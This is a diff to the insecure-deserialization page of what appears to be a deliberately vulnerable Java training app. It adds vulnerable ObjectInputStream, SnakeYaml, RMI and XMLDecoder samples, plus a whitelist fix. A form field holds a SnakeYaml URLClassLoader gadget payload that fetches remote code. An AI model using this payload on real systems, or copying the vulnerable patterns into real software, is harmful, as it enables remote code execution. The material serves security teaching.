@@ -14,24 +14,37 @@
         <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">
             <div class="vul_header">
                 <span>不安全的反序列化</span>
-                <a class="btn btn-sm btn-primary" target="_blank" href="">漏洞案例</a>
+                <a class="btn btn-sm btn-primary" target="_blank" href="#">漏洞案例</a>
             </div>
             <hr>
-            <div class="dec shadow-sm p-3 mb-4  rounded">反序列漏洞，当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码（多见于第三方组件产生的漏洞）
+            <ul class="nav nav-tabs">
+                <li class="nav-item">
+                    <a class="nav-link active" data-toggle="tab" href="#aa"><span class="lnr lnr-bug"></span> 漏洞描述</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" data-toggle="tab" href="#bb"><span class="lnr lnr-bullhorn"></span> 安全编码</a>
+                </li>
+            </ul>
+
+            <div class="tab-content">
+                <div class="tab-pane dec shadow-sm p-3 mb-4 rounded active" id="aa">
+                    反序列化漏洞，当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码（多见于第三方组件产生的漏洞）
+                </div>
+                <div class="tab-pane fade" id="bb">
+                    <textarea disabled="disabled" class="form-control shadow-sm p-3 mb-5 rounded" id="coder" style="height: 140px;">
+ 1. 更新commons-collections、commons-io等第三方库版本；
+ 2. 业务需要使用反序列化时，尽量避免反序列化数据可被用户控制，如无法避免建议尽量使用白名单校验的修复方式
+                    </textarea>
+                </div>
             </div>
 
-            <h5><span class="lnr lnr-bullhorn"> 编码建议</span></h5>
-            <textarea disabled="disabled" class="form-control p-2 mb-5 rounded" id="coder">
-更新commons-collections、commons-io等第三方库版本；
-业务需要使用反序列化时，尽量避免反序列化数据可被用户控制，如无法避免建议尽量使用白名单校验的修复方式
-            </textarea><hr>
-
+            <hr>
 
             <div class="box-float">
                 <div class="float1">
                     <a style="float:right" class="btn btn-sm btn-danger"
-                       href="/Deserialize/readObject?base64=payload">运行</a>
-                    <h5><span class="lnr lnr-bug"> 漏洞代码 - readObject</span></h5>
+                       href="/Deserialize/readObject/vul?base64=payload">运行</a>
+                    <h5><span class="lnr lnr-bug"> 漏洞代码 - ObjectInputStream</span></h5>
 
                     <textarea class="form-control" id="code1">
 // readObject，读取输入流,并转换对象。ObjectInputStream.readObject() 方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象。
@@ -55,19 +68,98 @@ public String cc(String base64) {
         return e.toString();
     }
 }
-                    </textarea>
+                    </textarea><br><br>
+
+
+                    <h5><span class="lnr lnr-bug"> 漏洞代码 - SnakeYaml</span></h5>
+                    <form role="search" th:action="@{/Deserialize/yaml/vul}" method="post">
+                        <div class="input-group mb-3">
+                            <input type="text" class="form-control" name="content"
+                                   value="!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://127.0.0.1:2222']]]]"
+                                   style="color: #b5babb">
+                            <div class="input-group-append">
+                                <button class="btn btn-sm btn-danger" type="submit">运行</button>
+                            </div>
+                        </div>
+                    </form>
+
+                    <textarea class="form-control" id="code2">
+// 远程服务器支持用户可以输入yaml格式的内容并且进行数据解析，没有做沙箱，黑名单之类的防控
+
+public void yaml(String content) {
+    Yaml y = new Yaml();
+    y.load(content);
+}
+                    </textarea><br><br>
+
+                    <a style="float:right" class="btn btn-sm btn-danger"
+                       href="#">运行</a>
+                    <h5><span class="lnr lnr-bug"> 漏洞代码 - RMI Registry</span></h5>
+
+                    <textarea class="form-control" id="code4">
+// Java RMI Registry 反序列化漏洞，受jdk版本影响，< = jdk8u111
+
+public String rmi() {
+    try {
+        Registry registry = LocateRegistry.createRegistry(9999);
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+    return "开启RMI监听，端口：9999";
+}
+                    </textarea><br><br>
+
 
                 </div>
 
                 <div class="float2">
 
                     <a style="float:right" class="btn btn-sm btn-success"
-                       href="#">运行</a>
+                       href="/Deserialize/readObject/safe?base64=payload">运行</a>
                     <h5><span class="lnr lnr-smile"> 安全代码 - 黑白名单</span></h5>
-                    <textarea class="form-control" id="code2">
+                    <textarea class="form-control" id="code3">
 // 使用Apache Commons IO的ValidatingObjectInputStream，accept方法来实现反序列化类白/黑名单控制
 
-                    </textarea>
+public String safe(String base64) {
+    try {
+        BASE64Decoder decoder = new BASE64Decoder();
+        base64 = base64.replace(" ", "+");
+        byte[] bytes = decoder.decodeBuffer(base64);
+
+        ByteArrayInputStream stream = new ByteArrayInputStream(bytes);
+        ValidatingObjectInputStream ois = new ValidatingObjectInputStream(stream);
+
+        // 只允许反序列化Student class
+        ois.accept(Student.class);
+        ois.readObject();
+
+        return "ValidatingObjectInputStream";
+     } catch (Exception e) {
+        return e.toString();
+}
+                    </textarea><br><br>
+
+                    <a style="float:right" class="btn btn-sm btn-danger"
+                       href="/Deserialize/XMLDecoder/vul">运行</a>
+                    <h5><span class="lnr lnr-bug"> 漏洞代码 - XMLDecoder</span></h5>
+
+                    <textarea class="form-control" id="code5">
+// XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。在项目中应禁止使用XMLDecoder方式解析XML内容
+
+String path = "src/main/resources/payload/calc-1.xml";
+File file = new File(path);
+FileInputStream fis = null;
+try {
+    fis = new FileInputStream(file);
+} catch (Exception e) {
+    e.printStackTrace();
+}
+
+BufferedInputStream bis = new BufferedInputStream(fis);
+XMLDecoder xmlDecoder = new XMLDecoder(bis);
+xmlDecoder.readObject();
+xmlDecoder.close();
+                    </textarea><br><br>
                 </div>
 
             </div>
